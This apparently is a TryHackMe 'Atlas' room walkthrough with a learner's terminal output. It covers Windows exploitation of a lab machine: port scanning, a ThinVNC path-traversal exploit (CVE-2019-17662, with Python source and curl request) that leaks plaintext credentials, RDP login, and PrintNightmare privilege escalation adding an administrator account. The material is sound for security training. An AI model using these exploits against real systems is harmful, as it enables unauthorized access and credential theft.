---
Hack the Atlas server in this beginner room covering Windows attack methodology!
---

![](https://assets.muirlandoracle.co.uk/thm/rooms/atlas/atlas-header.png)

![](https://tryhackme-images.s3.amazonaws.com/room-icons/4230419258baf63102a2e1fbe8e5e491.jpeg)

###  Introduction Room Overview and Deploy!

 Start Machine

Welcome to Atlas!

This is an introductory level room which aims to teach you the very basics of Windows system exploitation, from initial access, through to privilege escalation. You do not need any prior experience before attempting this room; however, it would help to have an understanding of [basic Linux usage](https://tryhackme.com/module/linux-fundamentals) and various other fundamental topics. Resources for these topics are linked at appropriate places in the room for extra reading.

You will find that a lot of this room is completely guided; however, there are places where the instructions are slightly more vague. These places are designed to help you develop the research mindset which is all-important in hacking.

Answer the questions below

Press the Green "Start Machine" button to deploy the machine!

_**Note:** It may take up to three minutes for this machine to fully boot._

### Enumeration Port Scanning

The key to hacking is information.

Contrary to what you may see in films and pop culture, hacking is not (usually) a matter of sitting in a darkened room and sending streams of green text cascading down a terminal window. Rather, it involves careful enumeration to find leverage-able mistakes in configurations or code and using them to force a system to do something that it is not supposed to do. For example, you may find that a web application fails to properly sanitise user input, resulting in you (as a white-hat hacker) being able to inject unwanted data into the database serving the site.

The _only_ way to find these vulnerabilities is to patiently enumerate the attack surface. The more you know about your target(s), the better placed you will be to find and exploit vulnerabilities whilst evading any protective measures in place around the system.

---

This room will be very simple, but that doesn't mean we can get away without enumeration.

Once we know our target (in this case we have one target with an IPv4 address of `MACHINE_IP`), the first thing we nearly always do is perform a _port scan._ As a brief summary: every computer with network capabilities has 65535 available _ports_. Each of these can have a different service bound to it. For example, a single server may host web services on ports 80 and 443, an SMTP mail server on port 25, and a proxy on port 8080. The first 1024 ports are considered "well-known" and are assigned to services by convention. For example, a web server will nearly always use port 80 for HTTP and port 443 for HTTPS connections; this means that your web browser knows what port to look at automatically, which is why you don't have to specify the port when navigating to a website.

_**Note:** We won't cover the differences between the TCP and UDP protocols in this room. I__f you are interested, please read the information [here](https://tryhackme.com/room/packetsframes). If you are already familiar with these protocols, assume that all referenced ports are TCP ports in this room._

The fact that a single server can host multiple services means that we need ascertain what the target is exposing to us over the network before we can attempt to exploit anything: cue, port scans.

Port scanning effectively attempts to connect to specified ports on the target and checks the responses from the server to see if each targeted port is open, closed, or protected by a firewall. The most common tool for port scanning is a Command Line tool called [Nmap](https://nmap.org/) -- it will be installed by default on any penetration testing distribution, including the AttackBox.

At its most basic, the syntax for Nmap is quite simply `nmap IP_ADDRESS`  
For example, scanning the always-running `10.10.10.10` box on the TryHackMe network gives us the following output:

Nmap Basic Syntax

```shell-session
pentester@attacker:~$ nmap 10.10.10.10
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-08 14:53 BST
Nmap scan report for 10.10.10.10
Host is up (0.032s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 0.58 seconds
```

This is useful, but it doesn't quite give us everything we want. For example, we may wish to scan more than the default 1000 ports; we may want more information about the target, or to perform service detection. For these purposes we use _switches_.

Switches are command line arguments that alter the functionality of a tool. Nmap has hundreds of available switches (or flags, to give them another name). For example, we could use `-vv` to increase the verbosity of the output Nmap provides; in context, the full command would look like this: `nmap -vv IP_ADDRESS`.

Here is a useful (but far from comprehensive) list of switches:

**Switch**  

**Does**  

`-vv`

Set verbosity level to two  

`-Pn`

Don't bother assessing whether the machine is active -- just scan it._  
**This is very useful for Windows machines** where ICMP echo (ping) packets are blocked by default on public networks._  

`-p PORT,PORT`  

Specify ports to scan, e.g. `-p 80,443`

This list will do for the time being, but please check out the [Nmap room](https://tryhackme.com/room/furthernmap) for a more thorough explanation of the tool if you haven't already done so.  

Answer the questions below

Scan your target IP (`MACHINE_IP`) with Nmap!  

_**Note:** you will need the_ `-Pn` _switch here. A complete command can be found in the hint._  

```
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.10.92.200 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.92.200:3389
Open 10.10.92.200:7680
Open 10.10.92.200:8080
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-01 20:50 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:50
Completed NSE at 20:50, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:50
Completed NSE at 20:50, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:50
Completed NSE at 20:50, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 20:50
Completed Parallel DNS resolution of 1 host. at 20:50, 0.03s elapsed
DNS resolution of 1 IPs took 0.06s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 20:50
Scanning 10.10.92.200 [3 ports]
Discovered open port 8080/tcp on 10.10.92.200
Discovered open port 3389/tcp on 10.10.92.200
Discovered open port 7680/tcp on 10.10.92.200
Completed Connect Scan at 20:50, 0.31s elapsed (3 total ports)
Initiating Service scan at 20:50
Scanning 3 services on 10.10.92.200
Completed Service scan at 20:52, 109.52s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.92.200.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:52
Completed NSE at 20:52, 7.62s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:52
Completed NSE at 20:52, 2.66s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:52
Completed NSE at 20:52, 0.00s elapsed
Nmap scan report for 10.10.92.200
Host is up, received user-set (0.30s latency).
Scanned at 2023-01-01 20:50:26 EST for 121s

PORT     STATE SERVICE       REASON  VERSION
3389/tcp open  ms-wbt-server syn-ack Microsoft Terminal Services
| ssl-cert: Subject: commonName=GAIA
| Issuer: commonName=GAIA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-01-01T01:48:15
| Not valid after:  2023-07-03T01:48:15
| MD5:   f11d67ae6db16ace9ffc8516cb23bf2c
| SHA-1: bb11b8cdffc250fe9b53ca5b61e10938b917ca9b
| -----BEGIN CERTIFICATE-----
| MIICzDCCAbSgAwIBAgIQF7xYiGQMsbVKR1jFy7Zl3TANBgkqhkiG9w0BAQsFADAP
| MQ0wCwYDVQQDEwRHQUlBMB4XDTIzMDEwMTAxNDgxNVoXDTIzMDcwMzAxNDgxNVow
| DzENMAsGA1UEAxMER0FJQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
| ALNmY6GXm1p/ire4NxnkvvaGnmXlvvFmnamAlrG1j3c42B7TMJeiszMoS3Rv23XL
| lB4Ld6x3oyk5CV3D7rsy6tXu2sCBMhezkupd/emUjgMwzbLk9eXxrM8j089R4g5I
| j6tA68CjD7PDESNZasLsYDTnY/y8b9OP0xNVxea80gvGY6ZMLHV9bZDCLyolmXk+
| MmTtkHcEnxcY/y747CU5OJ07p5j4XUPj1NlzF1Y4fRDBoepesGZ+9wfpO7+Be/9N
| 642rHC50DCegkXPUTzQkXedr0Zlyj4gDao1DS3lbaCmlRaneUryw20vvuP3e88dA
| Vl82IWKJk4vrYVNfICRuqSkCAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEw
| CwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBCwUAA4IBAQBlqnhbBEf6eaeT/I3/XIqZ
| o6sQfZsfb4ZtQMTC7rrnvMIYbY42PxUnN2yKWWD2ylhcH1hduT/+im1iYB4fJ+TZ
| WLigY7SBUsi4Y7HaCBYnsve51zGBv8xVJarFiXcy77efYbcvVS3MRzux15qJeDUB
| fkg66W7mqgKGmOV72BI1huFAC6i0rdoaGKnuv9dsofERXGYkyWOago5RVA7CQ/rq
| Qm6ajoL8bJD5VUhBCqxD5+GiF8ErPDLnUbFt3Z+FlIkWzvtIm/s7Yoegd5xPdkxa
| 4Gl0mYNnKxaGBvOJl/UJEE0W2ljfuTeM+pV/LqkN7Fw0itH6n/wucblWDLrBJcdk
|_-----END CERTIFICATE-----
|_ssl-date: 2023-01-02T01:52:24+00:00; 0s from scanner time.
7680/tcp open  pando-pub?    syn-ack
8080/tcp open  http-proxy    syn-ack
| http-auth: 
| HTTP/1.1 401 Access Denied\x0D
|_  Digest opaque=bB3d9A7bT5TmIf3wu9NgCKZ7SPAHFCtRVB qop=auth nonce=e/H2fgLw5UCo6ToCAvDlQA== realm=ThinVNC
| http-methods: 
|_  Supported Methods: GET POST
|_http-favicon: Unknown favicon MD5: CEE00174E844FDFEB7F56192E6EC9F5D
|_http-title: 401 Access Denied
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Type: text/html
|     Content-Length: 177
|     Connection: Keep-Alive
|     <HTML><HEAD><TITLE>404 Not Found</TITLE></HEAD><BODY><H1>404 Not Found</H1>The requested URL nice%20ports%2C/Tri%6Eity.txt%2ebak was not found on this server.<P></BODY></HTML>
|   GetRequest: 
|     HTTP/1.1 401 Access Denied
|     Content-Type: text/html
|     Content-Length: 144
|     Connection: Keep-Alive
|     WWW-Authenticate: Digest realm="ThinVNC", qop="auth", nonce="bZbzdALw5UDo1zoCAvDlQA==", opaque="V6a1oEg7moyejTQ88ouyxoKEiqALtyV4oP"
|_    <HTML><HEAD><TITLE>401 Access Denied</TITLE></HEAD><BODY><H1>401 Access Denied</H1>The requested URL requires authorization.<P></BODY></HTML>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.93%I=7%D=1/1%Time=63B2386E%P=x86_64-pc-linux-gnu%r(Get
SF:Request,179,"HTTP/1\.1\x20401\x20Access\x20Denied\r\nContent-Type:\x20t
SF:ext/html\r\nContent-Length:\x20144\r\nConnection:\x20Keep-Alive\r\nWWW-
SF:Authenticate:\x20Digest\x20realm=\"ThinVNC\",\x20qop=\"auth\",\x20nonce
SF:=\"bZbzdALw5UDo1zoCAvDlQA==\",\x20opaque=\"V6a1oEg7moyejTQ88ouyxoKEiqAL
SF:tyV4oP\"\r\n\r\n<HTML><HEAD><TITLE>401\x20Access\x20Denied</TITLE></HEA
SF:D><BODY><H1>401\x20Access\x20Denied</H1>The\x20requested\x20URL\x20\x20
SF:requires\x20authorization\.<P></BODY></HTML>\r\n")%r(FourOhFourRequest,
SF:111,"HTTP/1\.1\x20404\x20Not\x20Found\r\nContent-Type:\x20text/html\r\n
SF:Content-Length:\x20177\r\nConnection:\x20Keep-Alive\r\n\r\n<HTML><HEAD>
SF:<TITLE>404\x20Not\x20Found</TITLE></HEAD><BODY><H1>404\x20Not\x20Found<
SF:/H1>The\x20requested\x20URL\x20nice%20ports%2C/Tri%6Eity\.txt%2ebak\x20
SF:was\x20not\x20found\x20on\x20this\x20server\.<P></BODY></HTML>\r\n");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 0s

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 20:52
Completed NSE at 20:52, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 20:52
Completed NSE at 20:52, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 20:52
Completed NSE at 20:52, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 122.75 seconds
```

With the Nmap default port range, you should find that two ports are open. What port numbers are these?

Submit the answer as a comma-separated list from low to high, e.g. `80,443`.

*3389,8080*

What service does Nmap think is running on the higher of the two ports?

*http-proxy*

We would usually go on to do a lot more in-depth scanning, but we will leave it at that for this introductory room. We have what we need for the time being.  

 Completed


### Enumeration Service Enumeration

In the previous task we discovered two services -- now it's time to see what we can do with them!

The first service we found was on port 3389. This is traditionally Microsoft's **R**emote **D**esktop **P**rotocol (RDP), which is used to get a graphic remote desktop session on the remote machine. We can verify whether this _is_ RDP with an Nmap service scan:  

Service Scan Results

```html

```

Here the "Microsoft Terminal Services" tells us that this is indeed RDP. Knowing that this exists is beneficial as it potentially gives us a stable way to access the box later on; however, there are no recent vulnerabilities in the Microsoft implementation of RDP, so this isn't hugely useful to us at this moment in time.

---

Let's move on and have a look at the other service we found; this is more interesting. Port 8080 doesn't have an _official_ designation, but it is often used for alternative HTTP services; for example, HTTP proxies frequently use it -- as Nmap (incorrectly) identified this service as.

Nmap is unable to get an accurate reading on the service here, which makes it all the more interesting. What happens when we try to access it in a web browser?

![Screenshot showing the credential request from the server on port 8080](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d9e176315f8850e719252ed/room-content/d7f6be9e81b3e889eca38922caceac18.png)

We get an request for authentication; this could have gone better, but it _does_ tell us one very important thing: we are _definitely_  dealing with a web server of some kind.

Whilst newer versions of Firefox don't seem to show it, these HTTP Basic Authentication credential boxes usually come with a message from the server -- if we can get a look at that message then we might get a clue as to what is running on this port!

[cURL](https://curl.se/) is a command-line tool which lets us make (and craft) requests over various protocols -- most commonly HTTP(S).

Let's use it here to take a look at the headers the server is sending us when we connect to the port:  

cURL request

```html

```

We have a variety of sections in this request -- all have been highlighted.

-   In yellow we have the _request_ headers -- these are what we _sent_ to the server. We aren't interested in these just now.
-   In green we have the _response_ headers -- these are what the server sent to _us_ in response. This contains something interesting.
-   In cyan we have the response _body_ telling us that we aren't allowed to access the site unless we supply some credentials.

In red we have what we were looking for. "ThinVNC" is the name of a web-based **V**irtual **N**etwork **C**omputing (VNC) server. Like RDP, VNC allows us to access a device remotely; however, this server allows us to access to device from our web browser rather than requiring a separate client to connect. As a side note, if you are using the AttackBox in your browser right now then you are also connected to it using VNC.

A little research informs us that the latest release of ThinVNC is very old -- this vastly increases the chances of it being vulnerable to _something._ Let's open a terminal and use a tool called `searchsploit` to look for vulnerabilities for the software (querying the [Exploit-DB](https://exploit-db.com/) database):

Searchsploit Results

```shell-session
pentester@attacker:~$ searchsploit thinvnc
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
ThinVNC 1.0b1 - Authentication Bypass         | windows/remote/47519.py
---------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Bingo!  

Answer the questions below

Use searchsploit to find the vulnerability in ThinVNC

```

──(kali㉿kali)-[~]
└─$ curl http://10.10.92.200:8080 -v  
*   Trying 10.10.92.200:8080...
* Connected to 10.10.92.200 (10.10.92.200) port 8080 (#0)
> GET / HTTP/1.1
> Host: 10.10.92.200:8080
> User-Agent: curl/7.86.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 401 Access Denied
< Content-Type: text/html
< Content-Length: 144
< Connection: Keep-Alive
< WWW-Authenticate: Digest realm="ThinVNC", qop="auth", nonce="tr1noALw5UBI2ToCAvDlQA==", opaque="HGrkYh3xcZmYeJZ0d5UOivu6RorlmCo5dh"
< 
<HTML><HEAD><TITLE>401 Access Denied</TITLE></HEAD><BODY><H1>401 Access Denied</H1>The requested URL  requires authorization.<P></BODY></HTML>
* Connection #0 to host 10.10.92.200 left intact


┌──(kali㉿kali)-[~]
└─$ searchsploit ThinVNC                                                                          
---------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                              |  Path
---------------------------------------------------------------------------- ---------------------------------
ThinVNC 1.0b1 - Authentication Bypass                                       | windows/remote/47519.py
---------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                              
┌──(kali㉿kali)-[~]
└─$ searchsploit -m windows/remote/47519.py
  Exploit: ThinVNC 1.0b1 - Authentication Bypass
      URL: https://www.exploit-db.com/exploits/47519
     Path: /usr/share/exploitdb/exploits/windows/remote/47519.py
    Codes: CVE-2019-17662
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /home/kali/47519.py


                                                                                                              
┌──(kali㉿kali)-[~]
└─$ cat 47519.py 
# Exploit Title: ThinVNC 1.0b1 - Authentication Bypass
# Date: 2019-10-17
# Exploit Author: Nikhith Tumamlapalli
# Contributor WarMarX
# Vendor Homepage: https://sourceforge.net/projects/thinvnc/
# Software Link: https://sourceforge.net/projects/thinvnc/files/ThinVNC_1.0b1/ThinVNC_1.0b1.zip/download
# Version: 1.0b1
# Tested on: Windows All Platforms
# CVE : CVE-2019-17662

# Description:
# Authentication Bypass via Arbitrary File Read

#!/usr/bin/python3

import sys
import os
import requests

def exploit(host,port):
    url = "http://" + host +":"+port+"/xyz/../../ThinVnc.ini"
    r = requests.get(url)
    body = r.text
    print(body.splitlines()[2])
    print(body.splitlines()[3])



def main():
    if(len(sys.argv)!=3):
        print("Usage:\n{} <host> <port>\n".format(sys.argv[0]))
        print("Example:\n{} 192.168.0.10 5888")
    else:
        port = sys.argv[2]
        host = sys.argv[1]
        exploit(host,port)

if __name__ == '__main__':
    main() 
    
```

### Attack Foothold

At this point we would usually copy the exploit, read through it carefully (very important!) then deploy it against the target when we are satisfied that it only does what it claims to do.

In this case the exploit in Exploit-DB doesn't actually work, but it does give us an idea of what we're dealing with. The short version is:

The latest version of ThinVNC (at the time of writing) contains a path traversal vulnerability which effectively allows us to read any file on the target. Combine this with the fact that ThinVNC (stupidly) stores its access credentials in plaintext (i.e. completely unsecured), we can read the file containing the credentials and bypass the authentication!

For the sake of keeping things very simple, we are going to use a working copy of the exploit to access the credentials.  

Answer the questions below

_Clone_ the Git repository at [https://github.com/MuirlandOracle/CVE-2019-17662](https://github.com/MuirlandOracle/CVE-2019-17662)  to your attacking machine.

See if you can figure out how to do this in your terminal by yourself, otherwise, the command is given in the hint.  

git clone https://github.com/MuirlandOracle/CVE-2019-17662

 Completed

 Hint

Switch into the newly created exploit directory and set the file to be executable (`chmod +x CVE-2019-17662.py`) -- this may already be done for you, but better safe than sorry!

Try executing the exploit -- you should see a help menu

Making the Exploit Executable

```shell-session
pentester@attacker:~$ cd CVE-2019-17662/
pentester@attacker:~/CVE-2019-17662$ chmod +x CVE-2019-17662.py 
pentester@attacker:~/CVE-2019-17662$ ./CVE-2019-17662.py 
usage: CVE-2019-17662.py [-h] [-f FILE] [-s] [--accessible] host port
CVE-2019-17662.py: error: the following arguments are required: host, port
```

 Completed

Read through the exploit help menu

This script _requires_ two arguments. Ascertain what these arguments are, then use the script to exploit the vulnerable service on the target.

 Completed

Use the credentials found by the script to get past the HTTP Basic Auth presented when trying to access the vulnerable service in your web browser. You should have access to a user desktop!  

 Completed

**[Bonus Question -- Optional]** Read through the exploit code and try to perform the exploit manually using cURL or Burp Suite. You may need to look into _path normalisation_ for error debugging.  

 Completed

```
┌──(kali㉿kali)-[~/CVE-2019-17662]
└─$ python3 CVE-2019-17662.py 10.10.92.200 8080

     _____ _     _    __     ___   _  ____                                                                    
    |_   _| |__ (_)_ _\ \   / / \ | |/ ___|                                                                   
      | | | '_ \| | '_ \ \ / /|  \| | |                                                                       
      | | | | | | | | | \ V / | |\  | |___                                                                    
      |_| |_| |_|_|_| |_|\_/  |_| \_|\____|                                                                   
                                                                                                              
                            @MuirlandOracle                                                                   

                
[+] Credentials Found!
Username:       Atlas
Password:       H0ldUpTheHe@vens

using burpsuite

https://redteamzone.com/ThinVNC/

GET /admin/../../ThinVnc.ini HTTP/1.1

HTTP/1.1 200

Content-Type: application/binary

Content-Length: 149

Connection: Keep-Alive

[Authentication]

Unicode=0

User=Atlas

Password=H0ldUpTheHe@vens

Type=Digest

[Http]

Port=8080

Enabled=1

[Tcp]

Port=

[General]

AutoStart=1

https://www.youtube.com/watch?v=whqiiNXZlIk&ab_channel=%C4%A2%C4%93%C5%A6%C4%90%C5%97%C4%A9%C9%A4%C9%98

┌──(kali㉿kali)-[~/CVE-2019-17662]
└─$ curl -XGET "http://10.10.196.63:8080/witty/\../\../ThinVnc.ini" 

[Authentication]
Unicode=0
User=Atlas
Password=H0ldUpTheHe@vens
Type=Digest
[Http]
Port=8080
Enabled=1
[Tcp]
Port=
[General]
AutoStart=1

yep I did it, using burpsuite and curl :)
```

![[Pasted image 20230101223920.png]]
![[Pasted image 20230101223935.png]]

![[Pasted image 20230101224137.png]]

### Access VNC 🠖 RDP

If you've reached this task then you should have user access to the machine -- congratulations!

The access that we have just now is mildly revolting though. ThinVNC does not provide the nicest interface to use, and we struggle to use a lot of the functionality of the machine through it.

Cast your mind back to our initial enumeration. Remember we found that Microsoft Remote Desktop Services were running on port 3389? Assuming we have the proper credentials, we can connect to this from Linux using a tool called `xfreerdp`.

The syntax for using `xfreerdp` looks like this:  
`xfreerdp /v:10.10.196.63 /u:USERNAME /p:PASSWORD /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp`  

There's a bunch of stuff going on here, so let's break each switch down:

-   `/v:10.10.196.63` -- this is where we specify what we want to connect to.
-   `/u:USERNAME /p:PASSWORD` -- here we would substitute in a valid username/password combination.
-   `/cert:ignore` -- RDP connections are encrypted. If our attacking machine doesn't recognise the certificate presented by the machine we are connecting to it will warn us and ask if we wish to proceed; this switch simply ignores that warning automatically.
-   `+clipboard` -- this shares our clipboard with the target, allowing us to copy and paste between our attacking machine and the target machine.
-   `/dynamic-resolution` lets us resize the GUI window, adjusting the resolution of our remote session automatically.
-   `/drive:share,/tmp` -- our final switch, this shares our own `/tmp` directory with the target. This is an _extremely_ useful trick as it allows us to execute scripts and programs from our own machine without actually transferring them to the target (we will see this in action later!)

Answer the questions below

Most people take the easy option when it comes to passwords, which makes password reuse incredibly common.

With that in mind, use `xfreerdp` to connect to the target over RDP.

Use the same credentials you found in the previous task for VNC.

```
┌──(kali㉿kali)-[~/CVE-2019-17662]
└─$ xfreerdp /v:10.10.196.63 /u:Atlas /p:H0ldUpTheHe@vens /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp
[22:42:44:507] [1005300:1005309] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[22:42:44:507] [1005300:1005309] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[22:42:44:630] [1005300:1005309] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[22:42:44:630] [1005300:1005351] [INFO][com.freerdp.channels.rdpdr.client] - Loading device service drive [share] (static)
[22:42:44:631] [1005300:1005309] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[22:42:44:631] [1005300:1005309] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel disp
[22:42:58:847] [1005300:1005351] [INFO][com.freerdp.channels.rdpdr.client] - registered device #1: share (type=8 id=1)

adjusting for me

┌──(kali㉿kali)-[~/CVE-2019-17662]
└─$ xfreerdp /v:10.10.196.63 /u:Atlas /p:H0ldUpTheHe@vens /cert:ignore +clipboard /dynamic-resolution /drive:share,/tmp /size:85%


```

### Attack Privilege Escalation

Windows exploitation is a massive topic which is complicated greatly by the common-place nature of various defence mechanisms -- Anti-Virus software being the most well-known of these. Exploiting an up-to-date Windows target with the default defences active is _far_ outwith the scope of this room, so we will assume that the Atlas server has had the defence mechanisms de-activated.

At this point we would usually start to enumerate the target to look for privilege escalation opportunities (or potentially lateral movement opportunities in an Active Directory environment). [WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) and [Seatbelt](https://github.com/GhostPack/Seatbelt) are prime examples of tools that we may wish to employ here; however, there are many other tools available, and manual enumeration is always a wise idea.

That said, Windows enumeration can be daunting; there are hundreds of different vectors to consider. To keep this room simple, we will instead look at a set of exploits in the PrintSpooler service which are unpatched at the time of writing. PrintSpooler is notorious for privilege escalation vulnerabilities. It runs with the maximum available permissions (under the `NT AUTHORITY\SYSTEM` account) and is a popular target for vulnerability research. There have been many vulnerabilities found in this service in the past; however, one of the latest is referred to as "PrintNightmare".  

We will use PrintNightmare to elevate our privileges on this target.  

Answer the questions below

There are many different implementations of PrintNightmare available. You are advised to use a [PowerShell version](https://github.com/calebstewart/CVE-2021-1675) written by [Caleb Stewart](https://twitter.com/calebjstewart) and [John Hammond](https://twitter.com/_JohnHammond).  

 Completed

Navigate to the `/tmp` directory of your attacking VM, then clone the [repository](https://github.com/calebstewart/CVE-2021-1675).

Remember that `/drive:/tmp,share` argument in the `xfreerdp` command? It's about to come in useful.  

 Completed

Inside your RDP session, open a new PowerShell Window.  

 Completed

The repository that we downloaded contains a PowerShell (`.ps1`) script that needs to be imported.

We can import it using:  
`. \\tsclient\share\CVE-2021-1675\CVE-2021-1675.ps1`

_Make sure to include the dot at the start!_

This uses dot-syntax to import any functions exposed by the script. We are using `\\tsclient\share` to reference the share that we created. This allows us to view (and thus import) files that are stored in the /tmp folder of our own attacking machine!  

 Completed

Only one thing left to do: run the exploit!

We can start the ball rolling by executing `Invoke-Nightmare`.

Exploiting PrintNightmare

```powershell
PS C:\Users\Atlas> Invoke-Nightmare
[+] using default new user: adm1n
[+] using default new password: P@ssw0rd
[+] created payload at C:\Users\Atlas\AppData\Local\Temp\1\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_18b0d38ddfaee729\Amd64\mxdwdrv.dll"
[+] added user  as local administrator
[+] deleting payload from C:\Users\Atlas\AppData\Local\Temp\1\nightmare.dll
```

 Completed

Notice that our payload mentions creating a new user called `adm1n` with a password of `P@ssw0rd`? This is the default behaviour when using this exploit; however, we could have created our own payload and substituted that in should we have preferred another method of exploitation.

Regardless, we can now make use of our brand new admin account!  

 Completed

We could take the simple option of right-clicking on PowerShell or cmd.exe and choosing to "Run as Administrator", but that's no fun. Instead, let's use a hacky little PowerShell command to start a new high-integrity command prompt running as our new administrator.

The command is as follows:  
`Start-Process powershell 'Start-Process cmd -Verb RunAs' -Credential adm1n`

Execute this in your PowerShell session and follow the steps to spawn a new PowerShell process as an Administrator!  

 Completed

Run the command `whoami /groups` in the new window. You should see `BUILTIN\Administrators` in the list of groups, and a line at the bottom of the output containing `Mandatory Label\High Mandatory Level`.

whoami /groups

```powershell
  
PS C:\Windows\system32> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                                    Type             SID         
============================================================= ================ ============
Everyone                                                      Well-known group S-1-1-0     
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114   
BUILTIN\Administrators                                        Alias            S-1-5-32-544
BUILTIN\Users                                                 Alias            S-1-5-32-545
NT AUTHORITY\INTERACTIVE                                      Well-known group S-1-5-4
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11
NT AUTHORITY\This Organization                                Well-known group S-1-5-15
NT AUTHORITY\Local account                                    Well-known group S-1-5-113
LOCAL                                                         Well-known group S-1-2-0
NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10
Mandatory Label\High Mandatory Level                          Label            S-1-16-12288
```

These mean that you are running as an administrator with full access over the machine. Congratulations!

```
 git clone https://github.com/calebstewart/CVE-2021-1675.git

┌──(kali㉿kali)-[/tmp/CVE-2021-1675]
└─$ ls
CVE-2021-1675.ps1  nightmare-dll  README.md

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Atlas> . \\tsclient\share\CVE-2021-1675\CVE-2021-1675.ps1

Security warning
Run only scripts that you trust. While scripts from the internet can be useful, this script can potentially harm your
computer. If you trust this script, use the Unblock-File cmdlet to allow the script to run without this warning
message. Do you want to run \\tsclient\share\CVE-2021-1675\CVE-2021-1675.ps1?
[D] Do not run  [R] Run once  [S] Suspend  [?] Help (default is "D"): R
PS C:\Users\Atlas> Invoke-Nightmare
[+] using default new user: adm1n
[+] using default new password: P@ssw0rd
[+] created payload at C:\Users\Atlas\AppData\Local\Temp\1\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_18b0d38ddfaee729\Amd64\mxdwdrv.dll"
[+] added user  as local administrator
[+] deleting payload from C:\Users\Atlas\AppData\Local\Temp\1\nightmare.dll
PS C:\Users\Atlas> Start-Process powershell 'Start-Process cmd -Verb RunAs' -Credential adm1n


Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /groups

GROUP INFORMATION
-----------------

Group Name                                                    Type             SID          Attributes                  
============================================================= ================ ============ ===============================================================
Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                                        Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                                      Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
